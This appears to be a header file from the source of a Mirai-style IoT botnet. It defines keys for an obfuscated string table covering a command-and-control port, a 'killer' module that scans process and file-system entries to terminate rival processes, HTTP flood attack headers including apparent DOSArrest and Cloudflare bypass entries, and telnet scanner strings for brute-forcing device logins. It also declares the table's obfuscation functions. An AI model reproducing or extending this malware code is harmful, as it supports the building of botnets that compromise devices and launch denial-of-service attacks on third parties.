#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

// * ports and sucess message *
#define TABLE_EXEC_SUCCESS              1
#define TABLE_CNC_PORT                  2               

// * std rand string *
#define TABLE_MISC_RAND					3

// * vse and resolver data *
#define TABLE_ATK_VSE 					4
#define TABLE_ATK_RESOLVER 				5
#define TABLE_ATK_NSERV 				6

// * killer directory data *
#define TABLE_KILLER_PROC				7
#define TABLE_KILLER_MAPS				8
#define TABLE_KILLER_EXE				9
#define TABLE_KILLER_FD					10
#define TABLE_KILLER_TCP				11


// * maps scan match data *
#define TABLE_KILLER_ROOT				12
#define TABLE_KILLER_MNT				13
#define TABLE_KILLER_VAR				14
#define TABLE_KILLER_TMP				15
#define TABLE_KILLER_HOME				16

// * http attack data *
#define TABLE_ATK_KEEP_ALIVE            17
#define TABLE_ATK_ACCEPT                18  
#define TABLE_ATK_ACCEPT_LNG            19  
#define TABLE_ATK_CONTENT_TYPE          20  
#define TABLE_ATK_SET_COOKIE            21  
#define TABLE_ATK_REFRESH_HDR           22  
#define TABLE_ATK_LOCATION_HDR          23  
#define TABLE_ATK_SET_COOKIE_HDR        24  
#define TABLE_ATK_CONTENT_LENGTH_HDR    25  
#define TABLE_ATK_TRANSFER_ENCODING_HDR 26  
#define TABLE_ATK_CHUNKED               27  
#define TABLE_ATK_KEEP_ALIVE_HDR        28  
#define TABLE_ATK_CONNECTION_HDR        29  
#define TABLE_ATK_DOSARREST             30  
#define TABLE_ATK_CLOUDFLARE_NGINX      31  

#define TABLE_HTTP_ONE                  32
#define TABLE_HTTP_TWO                  33  
#define TABLE_HTTP_THREE                34  
#define TABLE_HTTP_FOUR                 35  
#define TABLE_HTTP_FIVE                 36  

// * telnet scanner data *
#define TABLE_SCAN_SHELL				37
#define TABLE_SCAN_ENABLE 				38
#define TABLE_SCAN_SYSTEM 				39
#define TABLE_SCAN_SH 					40
#define TABLE_SCAN_QUERY 				41
#define TABLE_SCAN_RESP					42
#define TABLE_SCAN_NCORRECT 			43
#define TABLE_SCAN_OGIN 				44
#define TABLE_SCAN_ENTER 				45
#define TABLE_SCAN_ASSWORD 				46
#define TABLE_SCAN_CB_PORT 				47
#define TABLE_SCAN_KILL_9 				48
#define TABLE_SCAN_PS 					49

#define TABLE_MAX_KEYS 50 // + 1 noob

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);

// * http useragents that I will work on later *

/*#define TABLE_HTTP_6 88
#define TABLE_HTTP_7 89
#define TABLE_HTTP_8 90
#define TABLE_HTTP_9 91
#define TABLE_HTTP_10 92
#define TABLE_HTTP_11 93
#define TABLE_HTTP_12 94
#define TABLE_HTTP_13 95
#define TABLE_HTTP_14 96
#define TABLE_HTTP_15 97
#define TABLE_HTTP_16 98
#define TABLE_HTTP_17 99 
#define TABLE_HTTP_18 100
#define TABLE_HTTP_19 101
#define TABLE_HTTP_20 102
#define TABLE_HTTP_21 103
#define TABLE_HTTP_22 104
#define TABLE_HTTP_23 105
#define TABLE_HTTP_24 106
#define TABLE_HTTP_25 107 */
